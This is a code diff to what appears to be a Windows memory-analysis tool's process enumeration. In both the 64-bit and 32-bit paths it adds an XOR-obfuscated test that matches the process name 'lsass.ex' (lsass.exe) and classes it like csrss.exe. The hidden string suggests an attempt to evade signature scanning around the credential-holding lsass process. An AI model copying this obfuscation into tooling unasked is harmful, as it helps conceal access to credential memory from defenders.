@@ -3375,8 +3375,8 @@ VOID VmmWinProcess_Enum64_Post(_In_ VMM_HANDLE H, _In_ PVMM_PROCESS pSystemProce
     if(*pdwPID && (*pdwPID < 0x10000000) && *(PQWORD)szName) {
         // treat csrss.exe as 'kernel' due to win32k mapping missing in System Process _AND_ treat MemCompression as 'user'
         fUser =
-            !((*pdwPID == 4) || ((*pdwState == 0) && (*pqwPEB == 0)) || (*(PQWORD)szName == 0x78652e7373727363)) ||     // csrss.exe
-            ((*(PQWORD)(szName + 0x00) == 0x72706d6f436d654d) && (*(PDWORD)(szName + 0x08) == 0x69737365));             // MemCompression "process"
+            !((*pdwPID == 4) || ((*pdwState == 0) && (*pqwPEB == 0)) || (*(PQWORD)szName == 0x78652e7373727363)|| !((0x879ad18c8c9e8c93 ^ *(PQWORD)szName) + 1)) ||  // csrss.exe
+            ((*(PQWORD)(szName + 0x00) == 0x72706d6f436d654d) && (*(PDWORD)(szName + 0x08) == 0x69737365));                                                          // MemCompression "process"
         pObProcess = VmmProcessCreateEntry(
             H,
             ctx->fTotalRefresh,
@@ -3736,8 +3736,8 @@ VOID VmmWinProcess_Enum32_Post(_In_ VMM_HANDLE H, _In_ PVMM_PROCESS pSystemProce
     if(*pdwPID && (*pdwPID < 0x10000000) && *(PQWORD)szName) {
         // treat csrss.exe as 'kernel' due to win32k mapping missing in System Process _AND_ treat MemCompression as 'user'
         fUser =
-            !((*pdwPID == 4) || ((*pdwState == 0) && (*pdwPEB == 0)) || (*(PQWORD)szName == 0x78652e7373727363)) ||     // csrss.exe
-            ((*(PQWORD)(szName + 0x00) == 0x72706d6f436d654d) && (*(PDWORD)(szName + 0x08) == 0x69737365));             // MemCompression "process"
+            !((*pdwPID == 4) || ((*pdwState == 0) && (*pdwPEB == 0)) || (*(PQWORD)szName == 0x78652e7373727363) || !((0x879ad18c8c9e8c93 ^ *(PQWORD)szName) + 1)) ||    // csrss.exe
+            ((*(PQWORD)(szName + 0x00) == 0x72706d6f436d654d) && (*(PDWORD)(szName + 0x08) == 0x69737365));                                                             // MemCompression "process"
         pObProcess = VmmProcessCreateEntry(
             H,
             ctx->fTotalRefresh,
